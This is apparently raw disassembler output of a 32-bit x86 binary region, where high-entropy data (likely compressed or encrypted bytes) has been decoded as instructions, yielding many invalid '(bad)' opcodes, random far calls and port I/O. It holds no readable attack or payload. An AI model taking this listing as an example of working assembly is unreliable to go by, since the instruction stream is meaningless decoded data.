  42ed48:	setg   BYTE PTR [ebp+0x3a]
  42ed4c:	ss xchg edi,eax
  42ed4e:	test   eax,0x7267bb20
  42ed53:	and    edi,DWORD PTR [eax]
  42ed55:	mov    esi,0x7252b89
  42ed5a:	rcr    DWORD PTR [ebx-0x2391191b],cl
  42ed60:	stos   BYTE PTR es:[edi],al
  42ed61:	cmp    eax,0x385a1bf8
  42ed66:	(bad)  
  42ed67:	jp     0x42ed03
  42ed69:	jns    0x42ed11
  42ed6b:	pop    edi
  42ed6c:	aas    
  42ed6d:	mov    bl,0x0
	...
  42edd3:	add    BYTE PTR [eax],al
  42edd5:	add    BYTE PTR [edx],ch
  42edd7:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42eddd:	mul    bl
  42eddf:	xor    al,BYTE PTR [ebp+0x1808e4a2]
  42ede5:	mov    eax,0x1f667
  42edea:	add    BYTE PTR [ecx],al
  42edec:	add    BYTE PTR [eax],al
  42edee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42edef:	(bad)  
  42edf0:	jecxz  0x42eddd
  42edf2:	loop   0x42edbb
  42edf4:	dec    edx
  42edf5:	scas   al,BYTE PTR es:[edi]
  42edf6:	sar    BYTE PTR [edi+eax*4],0xf9
  42edfa:	or     eax,0xc4c4fee1
  42edff:	xor    BYTE PTR ds:0xdff47281,dh
  42ee05:	std    
  42ee06:	dec    ebx
  42ee07:	(bad)  
  42ee08:	ds in  al,dx
  42ee0a:	adc    al,0xcb
  42ee0c:	xchg   bl,ch
  42ee0e:	jbe    0x42ee3c
  42ee10:	ins    BYTE PTR es:[edi],dx
  42ee11:	cs loop 0x42ee54
  42ee14:	cs push 0xffffffa0
  42ee17:	add    esp,DWORD PTR [ecx]
  42ee19:	test   BYTE PTR [ecx],cl
  42ee1b:	sub    al,0xe0
  42ee1d:	or     al,0x2a
  42ee1f:	xchg   DWORD PTR [edx],ecx
  42ee21:	or     DWORD PTR ss:[esi+eiz*2],0xffffff91
  42ee26:	arpl   WORD PTR [ebp+0x458b5012],ax
  42ee2c:	fadd   DWORD PTR [ecx]
  42ee2e:	jle    0x42ee12
  42ee30:	adc    DWORD PTR [esi-0x1c1b5359],ebx
  42ee36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee37:	pop    ds
  42ee38:	pop    esi
  42ee39:	adc    al,0x63
  42ee3b:	cmp    DWORD PTR [edx],0x33
  42ee3e:	aas    
  42ee3f:	push   ebp
  42ee40:	push   esp
  42ee41:	jne    0x42edec
  42ee43:	mov    bh,0xf
  42ee45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee46:	mov    ebp,0xf653217f
  42ee4b:	xor    dh,BYTE PTR ds:0x9bdeb1ce
  42ee51:	mov    ecx,0x60a0b782
  42ee56:	sbb    ebx,DWORD PTR [ebx+0x42300dea]
  42ee5c:	div    al
  42ee5e:	les    ebp,FWORD PTR [ebp-0x37b4b6ca]
  42ee64:	mov    esi,0x3963ba06
  42ee69:	inc    edx
  42ee6a:	dec    eax
  42ee6b:	not    esp
  42ee6d:	loop   0x42ee25
  42ee6f:	ins    BYTE PTR es:[edi],dx
  42ee70:	div    DWORD PTR [ebp-0x5fd6bc7c]
  42ee76:	mov    ch,0xf
  42ee78:	cmp    BYTE PTR [ecx],0xde
  42ee7b:	lock jns 0x42ee63
  42ee7e:	aam    0xf1
  42ee80:	and    BYTE PTR [eax],dl
  42ee82:	jle    0x42ee54
  42ee84:	mov    dl,0xeb
  42ee86:	sbb    BYTE PTR [edx-0x5f],dl
  42ee89:	dec    ebx
  42ee8a:	inc    ecx
  42ee8b:	xchg   ecx,eax
  42ee8c:	mov    esp,0x5513b477
  42ee91:	fisttp DWORD PTR ds:0xdd53c698
  42ee97:	mov    ecx,0x783ecc21
  42ee9c:	push   eax
  42ee9d:	aas    
  42ee9e:	pushf  
  42ee9f:	add    BYTE PTR [ecx+0x4f887896],al
  42eea5:	test   al,0x58
  42eea7:	adc    eax,DWORD PTR [eax]
  42eea9:	push   ebx
  42eeaa:	cmp    edx,DWORD PTR [ecx-0x7a]
  42eead:	mov    ah,0xff
  42eeaf:	mov    eax,ds:0x9971d7f
  42eeb4:	fiadd  WORD PTR [edx-0x5649c727]
  42eeba:	adc    eax,0x4b5fe863
  42eebf:	dec    edi
  42eec0:	test   DWORD PTR [eax+ebx*2-0x1f773671],edx
  42eec7:	daa    
  42eec8:	hlt    
  42eec9:	lods   al,BYTE PTR ds:[esi]
  42eeca:	or     BYTE PTR [ecx+0x61],0x9f
  42eece:	dec    edi
  42eecf:	dec    edi
  42eed0:	pushf  
  42eed1:	sub    al,0x29
  42eed3:	sub    ch,BYTE PTR [edi-0x10]
  42eed6:	and    al,0x7d
  42eed8:	cs dec ecx
  42eeda:	aaa    
  42eedb:	repz (bad)
  42eede:	repnz outs dx,DWORD PTR ds:[esi]
  42eee1:	in     eax,dx
  42eee2:	dec    ecx
  42eee3:	inc    ecx
  42eee4:	sub    al,0x5a
  42eee6:	lahf   
  42eee7:	fcomp  DWORD PTR [eax-0x1a]
  42eeea:	jno    0x42ef29
  42eeec:	or     edi,edi
	...
  42ef56:	ret    
  42ef57:	add    cl,BYTE PTR [eax]
  42ef59:	xor    eax,0xf6ff3fc9
  42ef5e:	jb     0x42ef9c
  42ef60:	jae    0x42ef87
  42ef62:	jle    0x42efb4
  42ef64:	test   al,0x27
  42ef66:	test   DWORD PTR [bx+di],0x10000
  42ef6d:	add    BYTE PTR [eax-0x71fbd169],dh
  42ef73:	and    al,0xe7
  42ef75:	clc    
  42ef76:	xchg   ebp,eax
  42ef77:	cdq    
  42ef78:	mov    esp,0xc4616e4b
  42ef7d:	adc    al,0x3b
  42ef7f:	sub    al,0x43
  42ef81:	lods   al,BYTE PTR ds:[esi]
  42ef82:	repz inc ebx
  42ef84:	adc    eax,0x1822d306
  42ef89:	out    0x4b,al
  42ef8b:	mov    WORD PTR [edx-0xb8812b9],fs
  42ef91:	xor    eax,0xbf1314db
  42ef96:	sar    BYTE PTR fs:[edx],0xbc
  42ef9a:	test   al,0x1d
  42ef9c:	sub    al,0x3a
  42ef9e:	pop    ss
  42ef9f:	pop    edi
  42efa0:	clc    
  42efa1:	push   ecx
  42efa2:	outs   dx,BYTE PTR ds:[esi]
  42efa3:	adc    al,0x74
  42efa5:	sub    BYTE PTR [edi+0x30],al
  42efa8:	dec    ebp
  42efa9:	inc    esp
  42efaa:	test   DWORD PTR [ebx],0x5dd2f146
  42efb0:	(bad)  
  42efb1:	mov    ecx,0x493289c2
  42efb6:	or     ecx,edx
  42efb8:	cmp    BYTE PTR [edx],0x54
  42efbb:	fdiv   DWORD PTR [edx]
  42efbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efbe:	pop    esp
  42efbf:	mov    edx,0xef881c08
  42efc4:	je     0x42efc8
  42efc6:	xor    bl,BYTE PTR [eax+0x2d59228]
  42efcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42efcd:	adc    DWORD PTR [eax],esi
  42efcf:	xor    DWORD PTR [ebp-0xf77109],esp
  42efd5:	lods   al,BYTE PTR ds:[esi]
  42efd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42efd7:	jmp    0x42effc
  42efd9:	sar    BYTE PTR [ebx-0x5d],1
  42efdc:	add    cl,BYTE PTR [ebx+0x4d54c850]
  42efe2:	push   edx
  42efe3:	out    0x70,eax
  42efe5:	xchg   DWORD PTR [esp+ebp*4+0x4b6cabd2],ebx
  42efec:	fdivr  QWORD PTR [ebx+0x31]
  42efef:	jl     0x42efb1
  42eff1:	in     al,0x73
  42eff3:	not    BYTE PTR [edi+0x30]
  42eff6:	xchg   esp,eax
  42eff7:	jmp    0x2dc6:0xf92f49d2
  42effe:	cli    
  42efff:	mov    ebx,0x32fc5d1c
  42f004:	cmp    ch,BYTE PTR ds:[edx]
  42f007:	sbb    DWORD PTR [ecx],eax
  42f009:	push   esi
  42f00a:	neg    DWORD PTR ds:0xb89cceb4
  42f010:	fwait
  42f011:	aad    0xd9
  42f013:	rol    BYTE PTR [esi],0x16
  42f016:	sahf   
  42f017:	xor    eax,0x693b3507
  42f01c:	jmp    0xd51b7389
  42f021:	stos   DWORD PTR es:[edi],eax
  42f022:	repnz pop ss
  42f024:	imul   BYTE PTR [esi-0x6b67f3f6]
  42f02a:	or     DWORD PTR [ecx+0x11],esi
  42f02d:	adc    eax,0x1d1bbcf
  42f032:	mov    al,0x18
  42f034:	in     eax,dx
  42f035:	jp     0x42f012
  42f037:	and    dl,bl
  42f039:	popa   
  42f03a:	js     0x42f0aa
  42f03c:	je     0x42efcf
  42f03e:	xor    eax,0x6ed7d4a4
  42f043:	dec    ebx
  42f044:	out    dx,eax
  42f045:	ss enter 0x2489,0xd4
  42f04a:	ins    DWORD PTR es:[edi],dx
  42f04b:	mov    al,ds:0xa908c0d1
  42f050:	fdivr  st,st(1)
  42f052:	fwait
  42f053:	and    bl,BYTE PTR [eax-0x11]
  42f056:	mov    cl,0xe2
  42f058:	cdq    
  42f059:	fisttp QWORD PTR [edx]
  42f05b:	or     bh,bl
  42f05d:	fcmovne st,st(3)
  42f05f:	xor    al,0x5c
  42f061:	pop    edx
  42f062:	div    BYTE PTR [ecx]
  42f064:	aam    0x54
  42f066:	into   
  42f067:	cdq    
  42f068:	int    0xec
  42f06a:	sub    cl,al
  42f06c:	shl    DWORD PTR [ecx+0x0],0x0
	...
  42f0d3:	add    BYTE PTR [eax],al
  42f0d5:	add    BYTE PTR [edx],dl
  42f0d7:	ds int 0xe5
  42f0da:	in     eax,dx
  42f0db:	idiv   DWORD PTR [edx]
  42f0dd:	(bad)  
  42f0de:	js     0x42f0e3
  42f0e0:	mov    DWORD PTR [ecx],ecx
  42f0e2:	fs lahf 
  42f0e4:	push   esp
  42f0e5:	dec    esi
  42f0e6:	addr16 clc 
  42f0e8:	add    DWORD PTR [eax],eax
  42f0ea:	add    BYTE PTR [ecx],al
  42f0ec:	add    BYTE PTR [eax],al
  42f0ee:	xor    edi,DWORD PTR [ebx+0x1c]
  42f0f1:	js     0x42f0cb
  42f0f3:	mov    bl,0xb
  42f0f5:	jl     0x42f0de
  42f0f7:	bound  esp,QWORD PTR [eax]
  42f0f9:	shl    edi,1
  42f0fb:	sahf   
  42f0fc:	mov    edi,ecx
  42f0fe:	or     al,0x9f
  42f100:	retf   
  42f101:	xlat   BYTE PTR ds:[ebx]
  42f102:	xchg   ebp,eax
  42f103:	shl    BYTE PTR [ecx+0x24],1
  42f106:	test   al,0x2a
  42f108:	xchg   esp,eax
  42f109:	(bad)  [esi-0x23b506b6]
  42f10f:	out    dx,eax
  42f110:	add    ecx,DWORD PTR [ebp-0x27]
  42f113:	mov    esp,0xa9881c06
  42f118:	imul   ebp,DWORD PTR [eax],0x26
  42f11b:	jmp    0x42f18e
  42f11d:	mov    cl,0xa0
  42f11f:	bnd ret 0xa88d
  42f123:	add    al,0xaa
  42f125:	jnp    0x42f0b7
  42f127:	adc    ah,BYTE PTR [ecx+edx*1]
  42f12a:	not    bl
  42f12c:	fidiv  DWORD PTR [ebx]
  42f12e:	pop    ebp
  42f12f:	sub    DWORD PTR [edx-0x2c17966f],0x927ee23
  42f139:	cmp    bl,BYTE PTR [ebx-0x60]
  42f13c:	jno    0x42f1ae
  42f13e:	test   eax,0x6a5fc3ec
  42f143:	push   esi
  42f144:	xor    ecx,DWORD PTR ds:0x89e1161c
  42f14a:	(bad)  
  42f14b:	jp     0x42f13f
  42f14d:	into   
  42f14e:	dec    edi
  42f14f:	jmp    0x42f1a7
  42f151:	pop    ecx
  42f152:	icebp  
  42f153:	mov    eax,0x86006a7
  42f158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f159:	pop    ebp
  42f15a:	sbb    bh,BYTE PTR [ebp+0x7e]
  42f15d:	add    DWORD PTR [ecx-0x230a4de1],ebp
  42f163:	test   bl,ch
  42f165:	push   edx
  42f166:	and    DWORD PTR [ecx+0x5816ded3],edi
  42f16c:	dec    eax
  42f16d:	mov    bh,cl
  42f16f:	(bad)  
  42f170:	jmp    0x42f1cc
  42f172:	sub    esi,esp
  42f174:	or     BYTE PTR [eax],bl
  42f176:	aas    
  42f177:	ret    0x937
  42f17a:	inc    edi
  42f17b:	sub    eax,0x894234d
  42f180:	(bad)  
  42f181:	cdq    
  42f182:	pop    ss
  42f183:	sub    BYTE PTR [eax+0x68ce8062],dh
  42f189:	or     eax,0x5c314b5a
  42f18e:	pop    es
  42f18f:	rol    DWORD PTR [edx-0x6fc42e4d],1
  42f195:	cmp    eax,0x3cab06fa
  42f19a:	xchg   eax,esi
  42f19c:	add    dl,ch
  42f19e:	call   0x728b1180
  42f1a3:	(bad)  
  42f1a4:	xchg   ebx,eax
  42f1a5:	add    DWORD PTR [eax+0x18],esi
  42f1a8:	or     DWORD PTR [edx],esi
  42f1aa:	sahf   
  42f1ab:	mov    ebx,0x851e3225
  42f1b0:	mov    esp,0x62c08d7
  42f1b5:	scas   al,BYTE PTR es:[edi]
  42f1b6:	mov    bh,0xee
  42f1b8:	repz test BYTE PTR [edx+0x331fec2f],ah
  42f1bf:	out    dx,eax
  42f1c0:	pop    ebx
  42f1c1:	rcl    DWORD PTR [ebp-0x15d7ab65],0x72
  42f1c8:	into   
  42f1c9:	clc    
  42f1ca:	mov    BYTE PTR ds:0x873f3868,bh
  42f1d0:	push   ds
  42f1d1:	dec    eax
  42f1d2:	addr16 and esi,ebx
  42f1d5:	xor    al,cl
  42f1d7:	in     eax,0x36
  42f1d9:	mov    edx,0xfe4b7f6
  42f1de:	xchg   edi,eax
  42f1df:	inc    edx
  42f1e0:	adc    bh,0xeb
  42f1e3:	out    dx,eax
  42f1e4:	fs iret 
  42f1e6:	sbb    bh,ch
  42f1e8:	and    BYTE PTR [eax+0x715da494],al
	...
  42f256:	pop    edx
  42f257:	es jecxz 0x42f29d
  42f25a:	inc    edi
  42f25c:	cli    
  42f25d:	aas    
  42f25e:	into   
  42f25f:	retf   0x3f8e
  42f262:	bsf    ebx,DWORD PTR [ebp+0x1f96792]
  42f269:	add    BYTE PTR [eax],al
  42f26b:	add    DWORD PTR [eax],eax
  42f26d:	add    BYTE PTR ds:0x2e97be27,dl
  42f273:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42f275:	retf   
  42f276:	mov    eax,ds:0x3872da40
  42f27b:	push   cs
  42f27c:	ffree  st(1)
  42f27e:	xor    bl,cl
  42f280:	lods   al,BYTE PTR ds:[esi]
  42f281:	ficom  DWORD PTR [ebx+0x1c8a0dd6]
  42f287:	cmpxchg DWORD PTR [esi-0x35539ef7],edx
  42f28e:	test   DWORD PTR [esi+ecx*8],edi
  42f291:	cmp    al,BYTE PTR [eax-0x14b0c0df]
  42f297:	xchg   BYTE PTR [esi+ebp*1],ch
  42f29a:	and    eax,0x7630f884
  42f29f:	call   FWORD PTR [esi+0x619b948e]
  42f2a5:	cmp    eax,0xc45ac02d
  42f2aa:	cwde   
  42f2ab:	xchg   BYTE PTR [ebx-0x76],cl
  42f2ae:	in     eax,0xaf
  42f2b0:	call   0xfa4c:0xa3b5b87f
  42f2b7:	push   cs
  42f2b8:	dec    esi
  42f2b9:	sbb    BYTE PTR [ebp+0x17ff9c7a],0xbf
  42f2c0:	pusha  
  42f2c1:	cs dec ebx
  42f2c3:	jnp    0x42f251
  42f2c5:	or     DWORD PTR ds:0x72ecb090,0xffffffaa
  42f2cc:	mov    ecx,0xb2b36d0
  42f2d1:	inc    edx
  42f2d2:	test   BYTE PTR [ecx-0x54],ch
  42f2d5:	repnz imul eax,DWORD PTR [ebp+0x3235a0b4],0x744bfd0a
  42f2e0:	adc    edx,DWORD PTR [ebp+0x71a335ed]
  42f2e6:	rcr    DWORD PTR [ecx+0x380a5f58],cl
  42f2ec:	in     al,dx
  42f2ed:	dec    esi
  42f2ee:	arpl   bp,cx
  42f2f0:	and    BYTE PTR [eax-0x3c6d3323],bl
  42f2f6:	xchg   esi,eax
  42f2f7:	ja     0x42f350
  42f2f9:	ins    DWORD PTR es:[edi],dx
  42f2fa:	mov    eax,ds:0x5840ba54
  42f2ff:	xor    esp,edx
  42f301:	pop    eax
  42f302:	mov    ds:0x7ebce0fa,eax
  42f307:	aaa    
  42f308:	out    0x26,eax
  42f30a:	imul   edx,ebp,0xdb3cf676
  42f310:	repz shl bh,cl
  42f313:	jmp    0xc72a1d50
  42f318:	sub    ah,BYTE PTR [esi+ebx*8+0x32b6f97c]
  42f31f:	in     eax,0x39
  42f321:	in     al,dx
  42f322:	xchg   esi,eax
  42f323:	sbb    al,0x2c
  42f325:	fs scas al,BYTE PTR es:[edi]
  42f327:	xchg   ebx,eax
  42f328:	jle    0x42f2ab
  42f32a:	mov    esi,0x813e3af
  42f32f:	out    dx,eax
  42f330:	pop    esi
  42f331:	repz and bl,al
  42f334:	and    cl,BYTE PTR [ecx+0x2f]
  42f337:	sub    eax,0x3fa9cf92
  42f33c:	mov    cl,0x4b
  42f33e:	push   ss
  42f33f:	ja     0x42f2fc
  42f341:	jmp    0x42f2e8
  42f343:	dec    BYTE PTR [ecx+eax*4-0x6a46c1f7]
  42f34a:	mul    DWORD PTR [edi]
  42f34c:	inc    edi
  42f34d:	test   eax,0xaa6d561c
  42f352:	mov    DWORD PTR ds:0x4c2c1ca1,esp
  42f358:	mov    dh,0x23
  42f35a:	or     DWORD PTR [ebx+ebx*8-0x10],0xa
  42f35f:	push   esi
  42f360:	fsubr  DWORD PTR [esi]
  42f362:	cmp    al,al
  42f364:	cdq    
  42f365:	mov    BYTE PTR [ecx],bh
  42f367:	bnd call 0x425e54d1
  42f36d:	(bad)  
	...
  42f3d6:	mov    ebp,0xaf8a081a
  42f3db:	call   0xcc3a:0x5ac03fbf
  42f3e2:	leave  
  42f3e3:	pushf  
  42f3e4:	fadd   st(2),st
  42f3e6:	addr16 cli 
  42f3e8:	add    DWORD PTR [eax],eax
  42f3ea:	add    BYTE PTR [ecx],al
  42f3ec:	add    BYTE PTR [eax],al
  42f3ee:	fwait
  42f3ef:	xchg   BYTE PTR [ebx],cl
  42f3f1:	call   0xf7e1e012
  42f3f6:	mov    BYTE PTR [esi-0x6cb17528],ch
  42f3fc:	repz ss pop esp
  42f3ff:	popa   
  42f400:	lds    ecx,FWORD PTR [ebx-0x7c952f1e]
  42f406:	mov    bl,0x71
  42f408:	dec    edx
  42f409:	test   al,0x50
  42f40b:	mov    al,ds:0x8ae77cab
  42f410:	out    0xac,eax
  42f412:	or     al,al
  42f414:	mov    esp,ds
  42f416:	shl    DWORD PTR [ebp+0x14859016],0xf5
  42f41d:	or     ecx,edx
  42f41f:	jo     0x42f41a
  42f421:	pop    es
  42f422:	sahf   
  42f423:	mov    edi,fs
  42f425:	fcomp  DWORD PTR [edx+0x6a040146]
  42f42b:	mov    esi,?
  42f42d:	out    dx,al
  42f42e:	jae    0x42f48f
  42f430:	cmp    edx,DWORD PTR [edx-0x2e17a285]
  42f436:	jo     0x42f41b
  42f438:	shr    BYTE PTR [eax],0x66
  42f43b:	or     ch,BYTE PTR [ebx]
  42f43d:	inc    ecx
  42f43e:	cmp    DWORD PTR [ebx-0x7e],ebp
  42f441:	inc    ebp
  42f443:	sbb    al,0xdc
  42f445:	ss xchg ecx,eax
  42f447:	popfw  
  42f449:	int3   
  42f44a:	test   al,0x26
  42f44c:	add    al,0x97
  42f44e:	sbb    al,0x40
  42f450:	int    0x93
  42f452:	sahf   
  42f453:	adc    dl,BYTE PTR [ecx+0x4b]
  42f456:	sub    al,0x9b
  42f458:	shl    DWORD PTR [ecx],0x47
  42f45b:	sti    
  42f45c:	fsub   DWORD PTR [eiz*1-0xb1890c]
  42f463:	call   DWORD PTR [edx-0x5ce1e584]
  42f469:	stos   DWORD PTR es:[edi],eax
  42f46a:	in     eax,0x10
  42f46c:	dec    ecx
  42f46d:	hlt    
  42f46e:	sbb    dl,ch
  42f470:	xor    BYTE PTR [esi+0x115374ea],dh
  42f476:	add    eax,0xe221a831
  42f47b:	repnz and DWORD PTR [ebx],ebp
  42f47e:	inc    edi
  42f47f:	ja     0x42f4fb
  42f481:	cs pop edi
  42f483:	mov    ch,0x3f
  42f485:	out    0x75,al
  42f487:	mov    ?,WORD PTR [ebp+0x79ba7bfa]
  42f48d:	and    bl,cl
  42f48f:	push   0xf0c074
  42f494:	mov    cl,0x3a
  42f496:	inc    eax
  42f497:	minps  xmm0,XMMWORD PTR [ebp-0x8d3cfa]
  42f49e:	fdiv   QWORD PTR [esi+ecx*8-0x185d02e1]
  42f4a5:	loopne 0x42f439
  42f4a7:	rol    DWORD PTR [eax],1
  42f4a9:	mov    edi,0x4c4fe7f1
  42f4ae:	test   esi,edx
  42f4b0:	int3   
  42f4b1:	xchg   esi,eax
  42f4b2:	aas    
  42f4b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f4b4:	add    ebp,DWORD PTR [esi+0x1bc78fe1]
  42f4ba:	fnsave [edi+0x77]
  42f4bd:	sbb    bl,bh
  42f4bf:	clc    
  42f4c0:	lds    esp,FWORD PTR [eax-0x41]
  42f4c3:	repnz xor esp,0xfffffffb
  42f4c7:	or     al,0x44
  42f4c9:	push   0x32
  42f4cb:	out    dx,al
  42f4cc:	jb     0x42f4e1
  42f4ce:	cmp    eax,0xcaa6e131
  42f4d3:	pop    esi
  42f4d4:	cld    
  42f4d5:	mov    ebx,DWORD PTR [eax]
  42f4d7:	test   eax,0x694b3cc2
  42f4dc:	mov    cl,0x4e
  42f4de:	xlat   BYTE PTR ds:[ebx]
  42f4df:	mov    ecx,0x216a314
  42f4e4:	xchg   BYTE PTR [edi],ah
  42f4e6:	mov    ch,0x5c
  42f4e8:	aaa    
  42f4e9:	jecxz  0x42f519
  42f4eb:	or     BYTE PTR [ebx+0xb0],bh
	...
  42f555:	add    BYTE PTR [edi],dh
  42f557:	jae    0x42f5a3
  42f559:	cdq    
  42f55a:	dec    esi
  42f55b:	mov    ecx,0x13f4fff7
  42f560:	jno    0x42f591
  42f562:	and    bh,BYTE PTR [eax-0x4988246]
  42f568:	add    DWORD PTR [eax],eax
  42f56a:	add    BYTE PTR [ecx],al
  42f56c:	add    BYTE PTR [eax],al
  42f56e:	adc    ah,BYTE PTR [edi+0xc40e6f7]
  42f574:	mov    dl,0x39
  42f576:	inc    edi
  42f577:	fiadd  WORD PTR [esi]
  42f579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f57a:	lods   eax,DWORD PTR ds:[esi]
  42f57b:	xchg   edi,eax
  42f57c:	(bad)  
  42f57e:	adc    eax,0xf09d106b
  42f583:	mov    dl,0x4a
  42f585:	fbstp  TBYTE PTR fs:[ebp+eiz*4+0x47cc9b43]
  42f58d:	sbb    al,0xe1
  42f58f:	leave  
  42f590:	mov    ecx,0x23e40ac9
  42f595:	dec    eax
  42f596:	sbb    DWORD PTR [ecx],edi
  42f598:	push   edx
  42f599:	mov    ch,0x20
  42f59b:	enter  0x745e,0x6c
  42f59f:	retf   
  42f5a0:	mov    al,0x70
  42f5a2:	sub    al,0x33
  42f5a4:	fldenv [edi+0x4f]
  42f5a7:	pop    esi
  42f5a8:	cmp    ch,cl
  42f5aa:	mov    edi,0x98834817
  42f5af:	sbb    DWORD PTR [edx+0x659ff6f5],ebp
  42f5b5:	cld    
  42f5b6:	call   0x78c2:0xe770a095
  42f5bd:	(bad)  
  42f5be:	in     eax,0xd4
  42f5c0:	pop    ebx
  42f5c1:	lods   eax,DWORD PTR ds:[esi]
  42f5c2:	sub    eax,0x70ba31fa
  42f5c7:	lea    eax,[edi+0x30]
  42f5ca:	jno    0x42f5d1
  42f5cc:	inc    ecx
  42f5cd:	daa    
  42f5ce:	fs cmc 
  42f5d0:	jnp    0x42f5fd
  42f5d2:	icebp  
  42f5d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f5d4:	mov    al,0xe1
  42f5d6:	fmul   DWORD PTR [edx]
  42f5d8:	sbb    DWORD PTR [eax],eax
  42f5da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f5db:	lock lods eax,DWORD PTR ds:[esi]
  42f5dd:	call   0x782f:0xc2d9c140
  42f5e4:	pop    DWORD PTR [esi-0x22]
  42f5e7:	lea    eax,[ebx]
  42f5e9:	push   ss
  42f5ea:	pop    ebx
  42f5eb:	lds    ecx,FWORD PTR [ebp+0x2f]
  42f5ee:	pop    esi
  42f5ef:	fnstcw WORD PTR [edi-0x617140bc]
  42f5f5:	xor    BYTE PTR [eax],bl
  42f5f7:	pop    ss
  42f5f8:	push   ss
  42f5f9:	xchg   esi,eax
  42f5fa:	addr16 pop ecx
  42f5fc:	adc    DWORD PTR [edi],esi
  42f5fe:	dec    eax
  42f5ff:	mov    bl,0xe3
  42f601:	or     DWORD PTR [ebx+0x3d],0x9a00e09e
  42f608:	call   0xe5bc:0x8c3b0fe3
  42f60f:	cli    
  42f610:	and    BYTE PTR [ebx+eiz*8+0x5e2907ef],dh
  42f617:	jnp    0x42f638
  42f619:	ror    DWORD PTR [esi-0x76c76620],0xe0
  42f620:	sar    DWORD PTR [edx-0x5a],1
  42f623:	aas    
  42f624:	stos   DWORD PTR es:[edi],eax
  42f625:	jge    0x42f683
  42f627:	xor    BYTE PTR [ecx-0x3b],0xa0
  42f62b:	(bad)  
  42f62c:	sti    
  42f62d:	test   DWORD PTR [edi+0x14],ebp
  42f630:	(bad)  
  42f631:	dec    ebx
  42f632:	mov    esi,0x4ba4aaf5
  42f637:	out    0x35,eax
  42f639:	in     eax,0x8
  42f63b:	(bad)  
  42f63c:	cmp    ebx,edi
  42f63e:	adc    al,0x62
  42f640:	and    eax,0x4d518d3d
  42f645:	ror    BYTE PTR [ecx+0x5],cl
  42f648:	arpl   WORD PTR [esi],sp
  42f64a:	je     0x42f633
  42f64c:	xor    DWORD PTR [edx+0x65],edi
  42f64f:	(bad)  
  42f650:	jae    0x42f60f
  42f652:	(bad)  
  42f654:	xchg   ecx,eax
  42f655:	mov    esi,0x565342a0
  42f65a:	push   edi
  42f65b:	jecxz  0x42f6af
  42f65d:	xor    ch,BYTE PTR [edi+edx*2-0x6b]
  42f661:	bound  eax,QWORD PTR [ecx+0x61a9b58]
  42f667:	adc    eax,0x6f3ccf83
  42f66c:	jge    0x42f6db
	...
  42f6d6:	ds push esi
  42f6d8:	into   
  42f6d9:	nop
  42f6da:	out    dx,al
  42f6db:	cwde   
  42f6dc:	jle    0x42f6dc
  42f6de:	push   eax
  42f6df:	sub    edx,esi
  42f6e1:	dec    esp
  42f6e2:	push   ebx
  42f6e3:	aaa    
  42f6e4:	(bad)  
  42f6e5:	retf   0xfc67
  42f6e8:	add    DWORD PTR [eax],eax
  42f6ea:	add    BYTE PTR [ecx],al
  42f6ec:	add    BYTE PTR [eax],al
  42f6ee:	test   BYTE PTR ds:0x66b79daa,0x4
  42f6f5:	mov    cl,cl
  42f6f7:	sub    esi,ecx
  42f6f9:	mov    ah,BYTE PTR [eax-0x359ea715]
  42f6ff:	fcomp  DWORD PTR [edi]
  42f701:	and    BYTE PTR [eax-0x62],cl
  42f704:	ss push es
  42f706:	pop    eax
  42f707:	aas    
  42f708:	push   0x2
  42f70a:	push   esp
  42f70b:	int3   
  42f70c:	lods   al,BYTE PTR ds:[esi]
  42f70d:	sar    DWORD PTR [ecx+0x62],cl
  42f710:	mov    ch,0x8e
  42f712:	and    BYTE PTR [esi-0x13],dh
  42f715:	add    BYTE PTR [ecx],cl
  42f717:	mov    esi,0xc5cff18b
  42f71c:	popf   
  42f71d:	call   0xab77:0x6c8b8a66
  42f724:	out    dx,al
  42f725:	jno    0x42f761
  42f727:	sahf   
  42f728:	lds    esp,FWORD PTR [ebp+eax*1-0x5a8a1d26]
  42f72f:	dec    ebx
  42f730:	pop    esp
  42f731:	scas   al,BYTE PTR es:[edi]
  42f732:	and    ah,BYTE PTR [edx+0x27]
  42f735:	(bad)  
  42f736:	mov    dl,0x67
  42f738:	imul   esp,ecx,0x5e702084
  42f73e:	in     al,0xa8
  42f740:	sahf   
  42f741:	sbb    esp,esi
  42f743:	loopne 0x42f703
  42f745:	sahf   
  42f746:	lods   eax,DWORD PTR ds:[esi]
  42f747:	js     0x42f7ae
  42f749:	daa    
  42f74a:	mov    DWORD PTR [ecx+ebx*1+0x55096298],esp
  42f751:	cmp    BYTE PTR [edx+0x5d],ch
  42f754:	call   0x57a09da4
  42f759:	std    
  42f75a:	mov    esi,0x487ea724
  42f75f:	popf   
  42f760:	adc    BYTE PTR ds:0xfd542c4f,0x5b
  42f767:	dec    edi
  42f768:	sub    edi,DWORD PTR [ebx-0x3b89349f]
  42f76e:	(bad)  
  42f76f:	jecxz  0x42f7ed
  42f771:	pop    edi
  42f772:	enter  0xe8e3,0x32
  42f776:	ret    
  42f777:	push   ds
  42f778:	js     0x42f743
  42f77a:	inc    ebx
  42f77b:	iret   
  42f77c:	jne    0x42f7a7
  42f77e:	push   ebp
  42f77f:	into   
  42f780:	inc    ecx
  42f781:	sub    ah,dl
  42f783:	scas   eax,DWORD PTR es:[edi]
  42f784:	ins    BYTE PTR es:[edi],dx
  42f785:	(bad)  
  42f787:	pop    esi
  42f788:	setno  BYTE PTR [ebx-0x5a]
  42f78c:	loope  0x42f7e4
  42f78e:	jg     0x42f7f5
  42f790:	mov    eax,ds:0x1b4a7de4
  42f795:	fsubrp st(6),st
  42f797:	rol    BYTE PTR [edi],1
  42f799:	out    0xbf,eax
  42f79b:	out    0x3f,eax
  42f79d:	pop    esp
  42f79e:	enter  0x5eae,0x10
  42f7a2:	pop    ecx
  42f7a3:	stos   BYTE PTR es:[edi],al
